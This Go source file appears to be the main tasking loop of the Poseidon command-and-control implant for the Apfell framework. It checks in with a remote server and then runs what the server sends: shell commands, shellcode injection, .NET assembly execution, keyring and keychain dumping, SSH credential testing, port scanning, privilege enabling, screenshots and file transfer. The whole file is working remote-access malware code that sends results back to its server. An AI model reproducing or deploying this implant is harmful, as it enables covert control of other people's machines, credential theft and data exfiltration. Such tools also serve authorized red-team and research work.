package main

import (
	"C"
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"strconv"
	"strings"
	"time"

	"github.com/xorrior/poseidon/pkg/commands/cat"
	"github.com/xorrior/poseidon/pkg/commands/getprivs"
	"github.com/xorrior/poseidon/pkg/commands/keys"
	"github.com/xorrior/poseidon/pkg/commands/ls"
	"github.com/xorrior/poseidon/pkg/commands/portscan"
	"github.com/xorrior/poseidon/pkg/commands/ps"
	"github.com/xorrior/poseidon/pkg/commands/screenshot"
	"github.com/xorrior/poseidon/pkg/commands/shell"
	"github.com/xorrior/poseidon/pkg/commands/sshauth"
	"github.com/xorrior/poseidon/pkg/commands/triagedirectory"
	"github.com/xorrior/poseidon/pkg/profiles"
	"github.com/xorrior/poseidon/pkg/utils/functions"
	"github.com/xorrior/poseidon/pkg/utils/structs"
)
import (
	"log"

	"github.com/xorrior/poseidon/pkg/commands/executeassembly"
	"github.com/xorrior/poseidon/pkg/commands/shinject"
)

var assemblyFetched int = 0

//export RunMain
func RunMain() {
	main()
}

func main() {

	// Initialize the  agent and check in

	currentUser, _ := user.Current()
	hostname, _ := os.Hostname()
	currIP := functions.GetCurrentIPAddress()
	currPid := os.Getpid()
	// Modify the profile used by changing this line
	profile := profiles.C2Patchthrough{}
	// profile := profiles.C2Default{}
	// profile := profiles.C2Slack{}
	// profile := profiles.C2Websocket{}
	profile.SetUniqueID(profiles.UUID)
	profile.SetURL(profiles.BaseURL)
	profile.SetURLs(profiles.BaseURLs)
	profile.SetSleepInterval(profiles.Sleep)
	profile.SetUserAgent(profiles.UserAgent)
	// Evaluate static variables
	if strings.Contains(profiles.ExchangeKeyString, "T") {
		profile.SetXKeys(true)
	} else {
		profile.SetXKeys(false)
	}

	if !strings.Contains(profiles.AesPSK, "PSK_REPLACE") && len(profiles.AesPSK) > 0 {
		profile.SetAesPreSharedKey(profiles.AesPSK)
	} else {
		profile.SetAesPreSharedKey("")
	}

	if len(profiles.HostHeader) > 0 {
		profile.SetHeader(profiles.HostHeader)
	}

	// Checkin with Apfell. If encryption is enabled, the keyx will occur during this process
	// fmt.Println(currentUser.Name)
	resp := profile.CheckIn(currIP, currPid, currentUser.Username, hostname)
	checkIn := resp.(structs.CheckinResponse)
	//log.Printf("Received checkin response: %+v\n", checkIn)
	profile.SetApfellID(checkIn.ID)

	tasktypes := map[string]int{
		"exit":             0,
		"shell":            1,
		"screencapture":    2,
		"keylog":           3,
		"download":         4,
		"upload":           5,
		"shinject":         6,
		"ps":               7,
		"sleep":            8,
		"cat":              9,
		"cd":               10,
		"ls":               11,
		"python":           12,
		"jxa":              13,
		"keys":             14,
		"triagedirectory":  15,
		"sshauth":          16,
		"portscan":         17,
		"getprivs":         18,
		"execute-assembly": 19,
		"none":             20,
	}

	// Channel used to catch results from tasking threads
	res := make(chan structs.ThreadMsg)
	//if we have an Active apfell session, enter the tasking loop
	if strings.Contains(checkIn.Status, "success") {
		for {
			time.Sleep(time.Duration(profile.SleepInterval()) * time.Second)

			// Get the next task
			t := profile.GetTasking()
			task := t.(structs.Task)

			switch tasktypes[task.Command] {
			case 0:
				// Throw away the response, we don't really need it for anything
				profile.PostResponse(task, "Exiting")
				os.Exit(0)
				break
			case 1:
				// Run shell command
				go shell.Run(task, res)
				break
			case 2:
				// Capture screenshot
				go screenshot.Run(task, res)
				break
			case 5:
				// File upload
				fileDetails := structs.FileUploadParams{}
				err := json.Unmarshal([]byte(task.Params), &fileDetails)
				if err != nil {
					profile.PostResponse(task, err.Error())
				}

				data := profile.Upload(task, fileDetails.FileID)
				if len(data) > 0 {
					f, e := os.Create(fileDetails.RemotePath)

					if e != nil {
						profile.PostResponse(task, e.Error())
					}

					n, failed := f.Write(data)

					if failed != nil && n == 0 {
						profile.PostResponse(task, failed.Error())
					}

					profile.PostResponse(task, "File upload successful")
				}

				break

			case 4:
				//File download
				profile.Download(task, task.Params)
				break

			case 6:
				tMsg := &structs.ThreadMsg{}
				tMsg.TaskItem = task
				args := &shinject.Arguments{}
				log.Println("Windows Inject:\n", string(task.Params))
				err := json.Unmarshal([]byte(task.Params), &args)

				if err != nil {
					tMsg.Error = true
					tMsg.TaskResult = []byte(err.Error())
					res <- *tMsg
					break
				}
				args.ShellcodeData = profile.GetFile(args.ShellcodeFile)

				log.Println("Length of shellcode:", len(args.ShellcodeData))
				if len(args.ShellcodeData) == 0 {
					tMsg.Error = true
					tMsg.TaskResult = []byte(fmt.Sprintf("File ID %s content was empty.", args.ShellcodeFile))
					res <- *tMsg
					break
				}
				go shinject.Run(args, tMsg, res)
				break
			case 7:
				go ps.Run(task, res)
				break
			case 8:
				// Sleep
				i, err := strconv.Atoi(task.Params)
				if err != nil {
					profile.PostResponse(task, err.Error())
					break
				}

				profile.SetSleepInterval(i)
				profile.PostResponse(task, "Sleep Updated..")
				break
			case 9:
				//Cat a file
				go cat.Run(task, res)
				break
			case 10:
				//Change cwd
				err := os.Chdir(task.Params)
				if err != nil {
					profile.PostResponse(task, err.Error())
					break
				}

				profile.PostResponse(task, fmt.Sprintf("changed directory to: %s", task.Params))
				break
			case 11:
				//List directory contents
				go ls.Run(task, res)
				break

			case 14:
				// Enumerate keyring data for linux or the keychain for macos
				go keys.Run(task, res)
				break
			case 15:
				// Triage a directory and organize files by type
				go triagedirectory.Run(task, res)
				break
			case 16:
				// Test credentials against remote hosts
				go sshauth.Run(task, res)
				break
			case 17:
				// Scan ports on remote hosts.
				go portscan.Run(task, res)
				break
			case 18:
				// Enable privileges for your current process.
				go getprivs.Run(task, res)
				break
			case 19:
				// Execute a .NET assembly
				tMsg := &structs.ThreadMsg{}
				tMsg.TaskItem = task
				args := &executeassembly.Arguments{}
				// log.Println("Windows Inject:\n", string(task.Params))
				err := json.Unmarshal([]byte(task.Params), &args)

				if err != nil {
					tMsg.Error = true
					tMsg.TaskResult = []byte(err.Error())
					res <- *tMsg
					break
				}

				if assemblyFetched == 0 {
					if args.LoaderFileID == "" {
						tMsg.Error = true
						tMsg.TaskResult = []byte("Have not fetched the .NET assembly yet. Please upload to the server and specify the file ID.")
						res <- *tMsg
						break
					}
					log.Println("Fetching loader file...")
					args.LoaderBytes = profile.GetFile(args.LoaderFileID)
					if len(args.LoaderBytes) == 0 {
						tMsg.Error = true
						tMsg.TaskResult = []byte(fmt.Sprintf("Invalid .NET Loader DLL retrieved. Length of DLL retrieved: %d", len(args.LoaderBytes)))
						res <- *tMsg
						break
					}
					log.Println("Done")
					assemblyFetched += 1 // Increment the counter so we know not to fetch it again.
				}
				log.Println("Fetching assembly bytes...")
				args.AssemblyBytes = profile.GetFile(args.AssemblyFileID)
				log.Println("Done")
				go executeassembly.Run(args, tMsg, res)
				break
			case 20:
				// No tasks, do nothing
				break
			}

			// Listen on the results channel for 1 second
			select {
			case toApfell := <-res:
				if strings.Contains(toApfell.TaskItem.Command, "screencapture") {
					profile.SendFileChunks(toApfell.TaskItem, toApfell.TaskResult)
				} else {
					profile.PostResponse(toApfell.TaskItem, string(toApfell.TaskResult))
				}

			case <-time.After(1 * time.Second):
				break
			}
		}
	}
}
